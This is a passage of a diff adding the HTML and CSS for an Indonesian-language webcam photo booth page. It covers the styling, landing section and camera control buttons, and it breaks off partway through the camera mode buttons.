@@ -1,0 +1,1850 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<title>PhotoBoothWeb - Kamera Online, Ambil Foto dengan Webcam</title>
+<meta name="description" content="Kamera online gratis: ambil foto dengan webcam atau HP, timer, filter, mirror mode. Simpan sebagai JPG. 100% privat, tanpa upload.">
+<style>
+:root{
+  --primary:#007aff;--primary-hover:#0056d6;--danger:#ef4444;
+  --text:#333;--text-soft:#666;--text-faint:#999;
+  --bg:#f8f8f8;--card:#fff;--border:#e5e5e5;--border-soft:#f0f0f0;
+  --shadow:rgba(0,0,0,.1);--header-h:56px;--pad:20px;
+  --cam-yellow:#ffd60a;--cam-fill:rgba(255,255,255,.14);--cam-fill-hover:rgba(255,255,255,.24);
+}
+[data-theme=dark]{
+  --primary:#0a84ff;--text:#e5e5e5;--text-soft:#a0a0a0;--text-faint:#666;
+  --bg:#1a1a1a;--card:#2a2a2a;--border:#3a3a3a;--border-soft:#333;--shadow:rgba(0,0,0,.3);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+[hidden]{display:none!important}
+html{background:var(--bg)}
+body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;
+  background:var(--bg);color:var(--text);min-height:100vh}
+a{color:var(--primary)}
+.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;
+  clip:rect(0,0,0,0);white-space:nowrap;border:0}
+:focus-visible{outline:2px solid var(--primary);outline-offset:2px}
+
+/* Header */
+.header{position:sticky;top:0;z-index:900;height:var(--header-h);background:var(--card);
+  border-bottom:1px solid var(--border)}
+.header-inner{height:100%;display:flex;align-items:center;gap:16px;padding:0 var(--pad);
+  max-width:1300px;margin:0 auto}
+.logo{font-size:22px;font-weight:700;letter-spacing:-.5px;text-decoration:none;color:var(--text)}
+.logo .dot{color:var(--primary)}
+.nav{margin-left:auto;display:flex;gap:18px;align-items:center}
+.nav-link{font-size:14px;font-weight:500;text-decoration:none;color:var(--text-soft)}
+.nav-link:hover{color:var(--primary)}
+.icon-btn{display:flex;align-items:center;justify-content:center;padding:8px;
+  background:0 0;border:none;border-radius:8px;cursor:pointer;color:var(--text-soft)}
+.icon-btn:hover{background:var(--bg)}
+.icon{fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;
+  stroke-linejoin:round;width:22px;height:22px}
+.icon-moon{display:none}
+[data-theme=dark] .icon-sun{display:none}
+[data-theme=dark] .icon-moon{display:block}
+
+/* Landing */
+.hero{min-height:calc(100vh - var(--header-h));display:flex;flex-direction:column;
+  align-items:center;justify-content:center;text-align:center;padding:40px 20px 80px}
+.hero h1{font-size:clamp(28px,5vw,48px);font-weight:700;margin-bottom:16px;letter-spacing:-1px}
+.hero-sub{font-size:17px;line-height:1.6;color:var(--text-soft);max-width:640px;margin-bottom:36px}
+.btn-hero{display:inline-flex;align-items:center;gap:12px;padding:20px 56px;
+  font-size:20px;font-weight:600;color:#fff;background:var(--primary);border:none;
+  border-radius:14px;cursor:pointer;box-shadow:0 4px 20px rgba(0,122,255,.35);
+  transition:transform .1s,background .15s}
+.btn-hero:hover{background:var(--primary-hover)}
+.btn-hero:active{transform:scale(.98)}
+.btn-hero .icon{width:1.3em;height:1.3em;stroke-width:2.5}
+.hero-hint{margin-top:20px;font-size:14px;color:var(--text-faint)}
+
+/* Editor / Camera */
+.editor{display:none;padding:12px 12px 0}
+.editor.active{display:block}
+.cam{position:relative;width:100%;max-width:1200px;
+  height:calc(100dvh - var(--header-h) - 24px);min-height:460px;
+  margin:0 auto;background:#000;color:#fff;border-radius:20px;overflow:hidden;
+  user-select:none;-webkit-user-select:none;-webkit-tap-highlight-color:transparent}
+.cam button{-webkit-tap-highlight-color:transparent}
+.ms{fill:currentColor;stroke:none;flex-shrink:0}
+
+.media-stage{position:absolute;inset:0;overflow:hidden;background:#000;touch-action:none}
+#video{display:block;width:100%;height:100%;object-fit:cover;opacity:0;transition:opacity .3s}
+#video.live{opacity:1}
+.grid-overlay{position:absolute;inset:0;display:none;pointer-events:none;
+  background-image:
+    linear-gradient(90deg,transparent calc(33.333% - .5px),rgba(255,255,255,.4) calc(33.333% - .5px),rgba(255,255,255,.4) calc(33.333% + .5px),transparent calc(33.333% + .5px),transparent calc(66.667% - .5px),rgba(255,255,255,.4) calc(66.667% - .5px),rgba(255,255,255,.4) calc(66.667% + .5px),transparent calc(66.667% + .5px)),
+    linear-gradient(transparent calc(33.333% - .5px),rgba(255,255,255,.4) calc(33.333% - .5px),rgba(255,255,255,.4) calc(33.333% + .5px),transparent calc(33.333% + .5px),transparent calc(66.667% - .5px),rgba(255,255,255,.4) calc(66.667% - .5px),rgba(255,255,255,.4) calc(66.667% + .5px),transparent calc(66.667% + .5px))}
+.grid-overlay.active{display:block}
+.countdown{position:absolute;inset:0;display:none;align-items:center;justify-content:center;pointer-events:none}
+.countdown.active{display:flex}
+.countdown span{font-size:clamp(96px,24vmin,190px);font-weight:200;line-height:1;
+  color:#fff;font-variant-numeric:tabular-nums;text-shadow:0 2px 28px rgba(0,0,0,.45);
+  animation:cam-count 1s ease-out}
+@keyframes cam-count{0%{opacity:0;transform:scale(1.18)}22%{opacity:1;transform:scale(1)}100%{opacity:.9}}
+
+/* Zoom */
+.zoom-row{position:absolute;z-index:12;display:flex;align-items:center;gap:6px;
+  left:50%;bottom:120px;transform:translateX(-50%);
+  padding:4px;border-radius:999px;background:rgba(0,0,0,.28);
+  -webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px)}
+.zoom-chip{width:38px;height:38px;padding:0;border:0;border-radius:50%;
+  background:rgba(0,0,0,.45);color:rgba(255,255,255,.95);font-size:13px;
+  font-weight:600;font-variant-numeric:tabular-nums;cursor:pointer;
+  transition:width .15s,height .15s,font-size .15s}
+.zoom-chip[aria-pressed=true]{width:44px;height:44px;font-size:14.5px;
+  font-weight:700;color:var(--cam-yellow);background:rgba(0,0,0,.6)}
+
+/* Top bar */
+.cam-top{--tb:42px;position:absolute;top:0;left:0;right:0;z-index:20;
+  display:flex;align-items:center;padding:8px 10px;background:#000;gap:2px}
+.cam-btn{flex:0 0 auto;width:var(--tb);height:var(--tb);padding:0;display:flex;
+  align-items:center;justify-content:center;border:0;border-radius:50%;
+  background:0 0;color:#fff;cursor:pointer;transition:background .15s,color .15s}
+.cam-btn .ms{width:25px;height:25px}
+.cam-btn:hover{background:var(--cam-fill)}
+.cam [aria-pressed=false]>.i-on,.cam [aria-pressed=true]>.i-off{display:none}
+#flashBtn[aria-pressed=true],#nightBtn[aria-pressed=true],#gridBtn[aria-pressed=true],
+#mirrorBtn[aria-pressed=true]{color:var(--cam-yellow)}
+.cam-tools{flex:1;min-width:0;display:flex;align-items:center;justify-content:space-evenly;
+  margin-left:4px}
+.cam-btn[aria-expanded=true]{background:var(--cam-fill)}
+.cam-btn.on{color:var(--cam-yellow)}
+.ratio-txt{padding:2px 3px;border:1.5px solid currentColor;border-radius:5px;
+  font-size:11px;font-weight:700;line-height:1}
+
+/* Opt row (aspect ratio) */
+.opt-row{position:absolute;top:60px;left:50%;transform:translateX(-50%);z-index:15;
+  display:flex;gap:4px;padding:6px;border-radius:12px;background:rgba(28,28,30,.95);
+  box-shadow:0 8px 30px rgba(0,0,0,.5);max-width:90%}
+.opt{flex:0 0 auto;min-width:44px;height:36px;padding:0 12px;border:0;border-radius:999px;
+  background:0 0;color:#fff;font-size:12px;font-weight:600;letter-spacing:.04em;
+  text-transform:uppercase;white-space:nowrap;cursor:pointer;
+  transition:background .15s,color .15s}
+.opt:hover{background:var(--cam-fill)}
+.opt[aria-pressed=true]{color:var(--cam-yellow);background:var(--cam-fill)}
+
+/* Bottom bar */
+.cam-bottom{position:absolute;left:0;right:0;bottom:0;z-index:20;
+  display:flex;flex-direction:column;align-items:center;gap:6px;
+  padding:6px 0 20px;background:#000}
+.cam-slot{position:relative;width:100%;height:44px;display:flex;
+  align-items:center;justify-content:center;overflow:hidden}
+.modes{position:absolute;inset:0;overflow:hidden;touch-action:none;cursor:grab;
+  -webkit-mask-image:linear-gradient(90deg,transparent,#000 18%,#000 82%,transparent);
+  mask-image:linear-gradient(90deg,transparent,#000 18%,#000 82%,transparent)}
+.modes-track{position:absolute;left:0;top:0;height:100%;display:flex;
+  align-items:center;white-space:nowrap;will-change:transform}
+.mode{padding:10px 11px;border:0;background:0 0;color:rgba(255,255,255,.92);
+  font-size:13px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;
+  white-space:nowrap;cursor:pointer}
+.mode:hover{color:#fff}
+.mode[aria-pressed=true]{color:var(--cam-yellow)}
+
+/* Camera mode pill */
+.cam-modes{display:flex;gap:2px;padding:3px;border-radius:999px;background:rgba(255,255,255,.1)}
+.mode-btn{width:46px;height:30px;padding:0;display:flex;align-items:center;
+  justify-content:center;border:0;border-radius:999px;background:0 0;color:#fff;cursor:pointer;
+  transition:background .15s,color .15s}
+.mode-btn .ms{width:21px;height:21px}
+.mode-btn[aria-pressed=true]{background:rgba(255,255,255,.2);color:var(--cam-yellow)}
+
+/* Actions row */
+.cam-actions{width:100%;max-width:440px;display:grid;
+  grid-template-columns:1fr auto 1fr;align-items:center;padding:0 24px}
+.thumb{grid-column:1;justify-self:start;position:relative;width:48px;height:48px;
+  padding:0;border:1px solid rgba(255,255,255,.35);border-radius:9px;overflow:hidden;
+  background:#1c1c1e;cursor:pointer;visibility:hidden}
+.thumb.has{visibility:visible}
+.thumb img{display:block;width:100%;height:100%;object-fit:cover}
+.thumb.vid::after{content:"";position:absolute;left:50%;top:50%;
+  margin:-6px 0 0 -4px;border:6px solid transparent;border-left:10px solid rgba(255,255,255,.95);
+  border-right:0;filter:drop-shadow(0 0 2px rgba(0,0,0,.6));pointer-events:none}
+
+.shutter{grid-column:2;position:relative;width:76px;height:76px;padding:0;
+  border:4px solid #fff;border-radius:50%;background:0 0;cursor:pointer}
+.shutter::after{content:"";position:absolute;inset:4px;border-radius:50%;
+  background:#fff;transition:transform .12s,border-radius .2s,background .2s}
+.shutter:hover::after{transform:scale(.96)}
+.shutter:active::after{transform:scale(.88)}
+.cam.video .shutter::after{background:#ff3b30}
+.cam.recording .shutter::after{transform:scale(.46);border-radius:9px}
+.burst-count{position:absolute;inset:0;z-index:1;display:flex;align-items:center;
+  justify-content:center;color:#000;font-size:20px;font-weight:600;
+  font-variant-numeric:tabular-nums}
+
+.flip{grid-column:3;justify-self:end;width:48px;height:48px;padding:0;display:flex;
+  align-items:center;justify-content:center;border:0;border-radius:50%;
+  background:var(--cam-fill);color:#fff;cursor:pointer;transition:background .15s}
+.flip:hover{background:var(--cam-fill-hover)}
+.flip .ms{width:28px;height:28px}
+
+/* Recording pill */
+.rec-pill{position:absolute;left:50%;top:12px;transform:translateX(-50%);
+  display:none;align-items:center;gap:7px;padding:5px 11px;border-radius:7px;
+  background:#ff3b30;color:#fff;font-size:15px;font-weight:600;
+  font-variant-numeric:tabular-nums;pointer-events:none;z-index:10}
+.rec-dot{width:8px;height:8px;border-radius:50%;background:#fff;
+  animation:cam-rec 1s steps(2,jump-none) infinite}
+@keyframes cam-rec{50%{opacity:.25}}
+.cam.recording .rec-pill{display:flex}
+.cam.recording #cameraSwitchBtn,.cam.recording #micBtn,
+.cam.recording #ratioBtn,.cam.recording #timerBtn,
+.cam.recording .cam-modes,.cam.recording .thumb{opacity:.3;pointer-events:none}
+
+/* Flash overlay */
+.flash-overlay{position:absolute;inset:0;z-index:60;background:#fff;opacity:0;
+  pointer-events:none;transition:opacity 50ms}
+.flash-overlay.active{opacity:1}
+
+/* Camera menu */
+.cam-menu{position:absolute;top:56px;left:12px;z-index:35;min-width:200px;
+  max-width:78%;max-height:48vh;overflow-y:auto;padding:6px;border-radius:14px;
+  background:rgba(28,28,30,.96);border:1px solid rgba(255,255,255,.12);
+  box-shadow:0 8px 30px rgba(0,0,0,.5);display:none}
+.cam-menu.active{display:block}
+.cam-menu button{display:flex;align-items:center;gap:10px;width:100%;text-align:left;
+  background:0 0;border:none;color:#fff;font-size:14px;padding:10px 12px;
+  border-radius:9px;cursor:pointer}
+.cam-menu button:hover{background:rgba(255,255,255,.1)}
+.cam-menu button.active{color:var(--cam-yellow)}
+.cam-menu .cam-tag{flex-shrink:0;font-size:10px;font-weight:700;letter-spacing:.5px;
+  text-transform:uppercase;padding:3px 7px;border-radius:6px;
+  background:rgba(255,255,255,.16)}
+.cam-menu .cam-name{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+/* Viewer */
+.viewer{position:absolute;inset:0;z-index:40;display:none;flex-direction:column;background:#000}
+.cam.viewing .viewer{display:flex}
+.view-top{display:grid;grid-template-columns:1fr auto 1fr;align-items:center;padding:6px 8px}
+.view-count{font-size:15px;font-weight:600;font-variant-numeric:tabular-nums}
+.cam-plain{width:44px;height:44px;padding:0;display:flex;align-items:center;
+  justify-content:center;border:0;border-radius:50%;background:0 0;color:#fff;cursor:pointer;
+  transition:background .15s}
+.cam-plain:hover{background:rgba(255,255,255,.1)}
+.cam-plain .ms{width:26px;height:26px}
+.view-area{position:relative;flex:1;min-height:0;display:flex;
+  align-items:center;justify-content:center;touch-action:pan-y}
+#viewImg{display:block;width:100%;height:100%;object-fit:contain}
+#viewVideo{display:block;width:100%;height:100%;object-fit:contain;background:#000}
+.view-bottom{display:flex;flex-direction:column;align-items:center;gap:10px;
+  padding:10px 12px 18px}
+.film-row{display:flex;align-items:center;gap:10px;max-width:100%}
+.all-btn{flex:0 0 auto;display:flex;align-items:center;gap:4px;height:36px;
+  padding:0 12px 0 9px;border:0;border-radius:999px;background:var(--cam-fill);
+  color:#fff;font-size:13px;font-weight:600;white-space:nowrap;cursor:pointer;
+  transition:background .15s}
+.all-btn:hover{background:var(--cam-fill-hover)}
+.all-btn .ms{width:19px;height:19px}
+.filmstrip{min-width:0;display:flex;gap:3px;max-width:100%;overflow-x:auto;
+  scrollbar-width:none}
+.filmstrip::-webkit-scrollbar{display:none}
+.filmstrip button{flex:0 0 auto;width:34px;height:44px;padding:0;border:0;
+  border-radius:4px;overflow:hidden;background:#1c1c1e;opacity:.55;cursor:pointer;
+  transition:width .2s,opacity .2s;position:relative}
+.filmstrip button.on{width:52px;opacity:1}
+.filmstrip img{display:block;width:100%;height:100%;object-fit:cover}
+.filmstrip button.vid::after{content:"";position:absolute;left:50%;top:50%;
+  margin:-6px 0 0 -4px;border:6px solid transparent;border-left:10px solid rgba(255,255,255,.95);
+  border-right:0;pointer-events:none}
+.view-group{justify-self:end;display:flex;gap:2px}
+.view-bottom .btn{width:auto;min-width:200px;padding:12px 22px;
+  background:var(--primary);color:#fff;border:none;border-radius:10px;
+  font-size:14px;font-weight:600;cursor:pointer;display:flex;
+  align-items:center;justify-content:center}
+.view-bottom .btn:hover{background:var(--primary-hover)}
+.view-bottom .btn .ms{width:20px;height:20px;margin-right:8px}
+
+/* Toast */
+.toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);
+  max-width:calc(100% - 40px);padding:12px 20px;font-size:14px;font-weight:500;
+  text-align:center;color:#fff;background:#333;border-radius:10px;
+  box-shadow:0 6px 20px var(--shadow);visibility:hidden;z-index:2000;
+  pointer-events:none}
+.toast.show{visibility:visible}
+
+/* Info section */
+.info{background:var(--card);margin-top:40px}
+.info-inner{max-width:800px;margin:0 auto;padding:60px 20px}
+.info h2{font-size:22px;font-weight:600;margin:32px 0 12px}
+.info h2:first-child{margin-top:0}
+.info p{font-size:16px;line-height:1.7;color:var(--text-soft);margin:0 0 14px}
+.info .faq{background:var(--bg);border-radius:12px;margin-bottom:10px;overflow:hidden}
+.info .faq summary{display:flex;justify-content:space-between;align-items:center;gap:12px;
+  padding:16px 20px;font-size:16px;font-weight:600;cursor:pointer;list-style:none}
+.info .faq summary::-webkit-details-marker{display:none}
+.info .faq summary::after{content:'+';font-size:20px;font-weight:400;
+  color:var(--text-faint);flex-shrink:0}
+.info .faq[open] summary::after{content:'\00d7'}
+.info .faq p{padding:0 20px 16px;margin:0}
+
+.footer{padding:25px;text-align:center;font-size:14px;color:var(--text-soft);
+  background:var(--card);border-top:1px solid var(--border)}
+.footer a{color:var(--text-soft);text-decoration:none}
+.footer a:hover{color:var(--primary)}
+
+/* Mobile */
+@media (max-width:899px),(max-height:520px) and (pointer:coarse){
+  #editor.active{position:fixed;inset:0;z-index:2000;min-height:0;padding:0;background:#000}
+  .cam{position:absolute;inset:0;width:auto;max-width:none;height:auto;
+    min-height:0;border-radius:0}
+  .cam-top{--tb:clamp(32px,10.4vw,42px);padding-top:max(8px,env(safe-area-inset-top))}
+  .cam-bottom{padding-bottom:max(20px,env(safe-area-inset-bottom))}
+  .cam-actions{padding:0 24px}
+  .shutter{width:72px;height:72px}
+  .zoom-row{bottom:130px}
+  .opt-row{top:52px;max-width:94%}
+}
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-inner">
+    <a href="/" class="logo">PhotoBooth<span class="dot">Web</span></a>
+    <nav class="nav" aria-label="Navigasi utama">
+      <a href="#" class="nav-link">Beranda</a>
+      <a href="#info" class="nav-link">Tentang</a>
+    </nav>
+    <button type="button" class="icon-btn" id="themeToggle" title="Mode gelap" aria-label="Toggle dark mode">
+      <svg class="icon icon-sun" viewBox="0 0 24 24" aria-hidden="true">
+        <circle cx="12" cy="12" r="4"/>
+        <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+      </svg>
+      <svg class="icon icon-moon" viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/>
+      </svg>
+    </button>
+  </div>
+</header>
+
+<main class="hero" id="landing">
+  <h1>Kamera Online – Ambil Foto Sekarang</h1>
+  <p class="hero-sub">Gunakan webcam atau kamera HP Anda langsung dari browser.
+    Lengkap dengan timer, filter, mirror mode, dan simpan sebagai JPG.
+    Gratis, tanpa upload, 100% privat.</p>
+  <button type="button" class="btn-hero" id="startBtn">
+    <svg class="icon" viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/>
+      <circle cx="12" cy="13" r="3"/>
+    </svg>
+    Mulai Kamera
+  </button>
+  <p class="hero-hint">Bisa dipakai di laptop, desktop, atau HP. Tanpa instalasi.</p>
+</main>
+
+<div class="editor" id="editor">
+  <div class="cam" id="cam">
+    <div class="media-stage" id="shotBox">
+      <video id="video" playsinline muted autoplay></video>
+      <div class="grid-overlay" id="gridOverlay" aria-hidden="true"></div>
+      <div class="countdown" id="countdown" aria-hidden="true"><span id="countdownNum"></span></div>
+      <div class="rec-pill" aria-live="off"><span class="rec-dot"></span><span id="recTime">00:00</span></div>
+    </div>
+
+    <div class="zoom-row" id="zoomRow" role="group" aria-label="Zoom">
+      <button type="button" class="zoom-chip" data-z="1" aria-pressed="true">1×</button>
+      <button type="button" class="zoom-chip" data-z="2" aria-pressed="false">2</button>
+      <button type="button" class="zoom-chip" data-z="3" aria-pressed="false">3</button>
+    </div>
+
+    <div class="cam-top" id="camTop">
+      <button type="button" class="cam-btn" id="closeBtn" title="Tutup kamera (Esc)" aria-label="Tutup kamera">
+        <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+          <path d="M480-438 270-228q-9 9-21 9t-21-9q-9-9-9-21t9-21l210-210-210-210q-9-9-9-21t9-21q9-9 21-9t21 9l210 210 210-210q9-9 21-9t21 9q9 9 9 21t-9 21L522-480l210 210q9 9 9 21t-9 21q-9 9-21 9t-21-9L480-438Z"/>
+        </svg>
+      </button>
+      <div class="cam-tools">
+        <button type="button" class="cam-btn" id="flashBtn" title="Flash (F)" aria-label="Flash" aria-pressed="false">
+          <svg class="ms i-off" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M606-440 299-747q-12-12-17.5-26.5T276-803q0-29 19.5-53t54.5-24h268q24 0 38.5 18.5T664-820l-64 220h74q27 0 40 24t-3 47l-59 85q-8 11-22 12.5t-24-8.5ZM792-83 561-313 441-139q-4 6-11 8t-14 0q-7-2-11.5-7.5T400-152v-248h-60q-25 0-42.5-17.5T280-460v-134L82-792q-9-9-8.5-21.5T83-835q9-9 21.5-9t21.5 9l709 710q9 9 9 21t-9 21q-9 9-21.5 9T792-83Z"/>
+          </svg>
+          <svg class="ms i-on" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M404.5-138.5Q400-144 400-152v-248h-60q-25 0-42.5-17.5T280-460v-360q0-25 17.5-42.5T340-880h278q23 0 38 18.5t8 41.5l-64 220h74q27 0 40 24t-3 47L441-139q-5 7-11.5 8.5T416-131q-7-2-11.5-7.5Z"/>
+          </svg>
+        </button>
+        <button type="button" class="cam-btn" id="nightBtn" title="Night mode (N)" aria-label="Night mode" aria-pressed="false">
+          <svg class="ms i-off" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M484-80q-84 0-157.5-32t-128-86.5Q144-253 112-326.5T80-484q0-132 77.5-238T361-868q17-5 31 5t12 27q-7 88 23.5 169.5T521-522q63 63 145 94t170 24q17-2 26.5 13t4.5 32q-40 125-145.5 202T484-80Z"/>
+          </svg>
+          <svg class="ms i-on" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M484-80q-84 0-157.5-32t-128-86.5Q144-253 112-326.5T80-484q0-132 77.5-238T361-868q17-5 31 5t12 27q-7 88 23.5 169.5T521-522q63 63 145 94t170 24q17-2 26.5 13t4.5 32q-40 125-145.5 202T484-80Z"/>
+          </svg>
+        </button>
+        <button type="button" class="cam-btn" id="micBtn" title="Rekam suara" aria-label="Rekam suara" aria-pressed="true">
+                    <svg class="ms i-off" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M658-381q-10-8-11-20t7-22q10.89-16.84 17.89-35.97T682-498q2-13 10.68-22 8.67-9 21.5-9 12.82 0 21.32 9.07 8.5 9.08 6.5 21.93-4 30.21-14 59.1-10 28.9-28 53.9-8 10-19.94 11-11.93 1-22.06-7ZM461-586q0-19-11.5-32.5T478-632q18 0 29.5 13.5T519-586v226q0 15-9.32 22.5t-20.5 7.5q-11.18 0-20.68-7.94T460-360v-226Zm-2.94-294q42.06 0 71.56 29.46T559-779v226q0 15-9.32 22.5t-20.5 7.5q-11.18 0-20.68-7.94T499-554v-225q0-17.42-12-29.21T458-820q-17 0-29 11.79T417-779v83q0 15-9.32 22.5t-20.5 7.5q-11.18 0-20.68-7.68-9.5-7.69-9.5-22.32v-83q0-42.08 29.44-71.54Q415.88-880 457.94-880ZM428-150v-106q-96-11-166.5-77.5T180-498q-2-12.85 6.59-21.93 8.6-9.07 21.5-9.07 12.91 0 21.35 8.91 8.45 8.92 10.56 22.09 12 81 75 132.5T458.15-314q37.85 0 72.96-12.34Q566.22-338.67 595-361l43 43q-31 26-69.01 41.57Q530.97-260.86 488-256v106q0 12.75-8.68 21.37-8.67 8.63-21.5 8.63-12.82 0-21.32-8.63-8.5-8.62-8.5-21.37Zm378 76L49-831q-8-8-8-19t8-19q8-8 19-8t19 8l757 757q8 8 8 19t-8 19q-8 8-19 8t-19-8Z"/>
+          </svg>
+        </button>
+        <button type="button" class="cam-btn" id="exposureBtn" title="Exposure" aria-label="Exposure" aria-expanded="false">
+          <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M180-120q-24 0-42-18t-18-42v-600q0-24 18-42t42-18h600q24 0 42 18t18 42v600q0 24-18 42t-42 18H180Zm0-60h600v-600L180-180Zm414-136h-63q-10.83 0-17.92-7.12-7.08-7.11-7.08-18 0-10.88 7.08-17.88 7.09-7 17.92-7h63v-63q0-10.83 7.12-17.92 7.11-7.08 18-7.08 10.88 0 17.88 7.08 7 7.09 7 17.92v63h63q10.83 0 17.92 7.12 7.08 7.11 7.08 18 0 10.88-7.08 17.88-7.09 7-17.92 7h-63v63q0 10.83-7.12 17.92-7.11 7.08-18 7.08-10.88 0-17.88-7.08-7-7.09-7-17.92v-63ZM405-638q10.83 0 17.92-7.12 7.08-7.11 7.08-18 0-10.88-7.08-17.88-7.09-7-17.92-7H253q-10.83 0-17.92 7.12-7.08 7.11-7.08 18 0 10.88 7.08 17.88 7.09 7 17.92 7h152Z"/>
+          </svg>
+        </button>
+        <button type="button" class="cam-btn" id="timerBtn" title="Self-timer: Off / 3s / 10s" aria-label="Self-timer">
+          <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+            <path id="timerBtnPath" d="M480-801q68 0 126.5 22.5T711-716l30-30q9-9 21-9t21 9q9 9 9 21t-9 21l-30 30q45 49 66 108.5T840-441q0 38-7.5 75T808-294q-8 17-20 21t-23-1q-11-5-16-14.5t0-20.5q14-27 22.5-60.5T780-441q0-125-87.5-212.5T480-741q-37 0-71.5 8.5T347-710q-11 6-21 1t-15-16q-5-11-1.5-23t20.5-20q35-17 73.5-25t76.5-8Zm30 276v-88q0-13-8.5-21.5T480-643q-13 0-21.5 8.5T450-613v28l60 60ZM480-81q-74 0-139.5-28.5T226-187q-49-49-77.5-114.5T120-441q0-61 18.5-116T199-665L78-786q-9-9-9-21.5t9-21.5q9-9 21.5-9t21.5 9l709 709q9 9 9 21t-9 21q-9 9-21.5 9T787-78l-83-82q-48 38-103.5 58.5T480-81Z"/>
+          </svg>
+        </button>
+        <button type="button" class="cam-btn" id="ratioBtn" title="Aspect ratio (R)" aria-label="Aspect ratio" aria-expanded="false">
+          <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M180-120q-24 0-42-18t-18-42v-142q0-12.75 8.68-21.38 8.67-8.62 21.5-8.62 12.82 0 21.32 8.62 8.5 8.63 8.5 21.38v142h142q12.75 0 21.38 8.68 8.62 8.67 8.62 21.5 0 12.82-8.62 21.32-8.63 8.5-21.38 8.5H180Zm600 0H638q-12.75 0-21.37-8.68-8.63-8.67-8.63-21.5 0-12.82 8.63-21.32 8.62-8.5 21.37-8.5h142v-142q0-12.75 8.68-21.38 8.67-8.62 21.5-8.62 12.82 0 21.32 8.62 8.5 8.63 8.5 21.38v142q0 24-18 42t-42 18ZM120-638v-142q0-24 18-42t42-18h142q12.75 0 21.38 8.68 8.62 8.67 8.62 21.5 0 12.82-8.62 21.32-8.63 8.5-21.38 8.5H180v142q0 12.75-8.68 21.37-8.67 8.63-21.5 8.63-12.82 0-21.32-8.63-8.5-8.62-8.5-21.37Zm660 0v-142H638q-12.75 0-21.37-8.68-8.63-8.67-8.63-21.5 0-12.82 8.63-21.32 8.62-8.5 21.37-8.5h142q24 0 42 18t18 42v142q0 12.75-8.68 21.37-8.67 8.63-21.5 8.63-12.82 0-21.32-8.63-8.5-8.62-8.5-21.37Z"/>
+          </svg>
+        </button>
+        <button type="button" class="cam-btn" id="gridBtn" title="Grid (G)" aria-label="Toggle grid" aria-pressed="false">
+          <svg class="ms i-off" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M340-180v-160H180v160h160Zm220 0v-134l-26-26H400v160h160Zm60 0Zm86-160Zm-366-60v-134l-26-26H180v160h160Zm380 0v-160H620v134l26 26h134ZM180-620v-160h160v134l26 26h134ZM180-620Z"/>
+          </svg>
+          <svg class="ms i-on" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M180-120q-24 0-42-18t-18-42v-600q0-24 18-42t42-18h600q24 0 42 18t18 42v600q0 24-18 42t-42 18H180Zm0-60h160v-160H180v160Zm220 0h160v-160H400v160Zm220 0h160v-160H620v160ZM180-400h160v-160H180v160Zm220 0h160v-160H400v160Zm220 0h160v-160H620v160ZM180-620h160v-160H180v160Zm220 0h160v-160H400v160Zm220 0h160v-160H620v160Z"/>
+          </svg>
+        </button>
+        <button type="button" class="cam-btn" id="mirrorBtn" title="Mirror (M)" aria-label="Mirror" aria-pressed="true">
+          <svg class="ms" viewBox="0 0 256 256" aria-hidden="true">
+            <path d="M120,40V200a16,16,0,0,1-16,16H40a16,16,0,0,1-14.78-22.15l64-159.93.06-.14A16,16,0,0,1,120,40ZM229.33,208.84A16,16,0,0,1,216,216H152a16,16,0,0,1-16-16V40a16,16,0,0,1,30.74-6.23l.06.14,64,159.93A16,16,0,0,1,229.33,208.84ZM216,200l-.06-.15L152,40V200Z"/>
+          </svg>
+        </button>
+      </div>
+      <div class="opt-row" id="optRow" role="group" aria-label="Aspect ratio" hidden></div>
+    </div>
+
+    <div class="cam-bottom" id="camBottom">
+      <div class="cam-slot">
+        <div class="modes" id="filterStrip" role="group" aria-label="Filter foto">
+          <div class="modes-track" id="filterTrack"></div>
+        </div>
+      </div>
+      <div class="cam-modes" role="group" aria-label="Mode kamera">
+        <button type="button" class="mode-btn" id="modePhoto" title="Photo (V)" aria-label="Photo" aria-pressed="true">
+          <svg class="ms" viewBox="0 -960 960 960" aria-hidden="true">
+            <path d="M480-267q72 0 121-49t49-121q0-73-49-121.5T480-607q-73 0-121.5 48.5T310-437q0 72 48.5 121T480-267Zm0-60q-48 0-79-31.5T370-437q0-48 31-79t79-31q47 0 78.5 31t31.5 79q0 47-31.5 78.5T480-327ZM140-120q-24 0-42-18t-18-42v-513q0-23 18-41.5t42-18.5h147l55-66q8-11 20-16t26-5h184q14 0 26 5t20 16l55 66h147q23 0 41.5 18.5T880-693v513q0 24-18.5 42T820-120H140Z"/>
+          </svg>
+        </button>
+        <button type="button" class="mode-btn" id="modeVideo" title="Video (V)" aria-label="Video" aria-pressed="false">
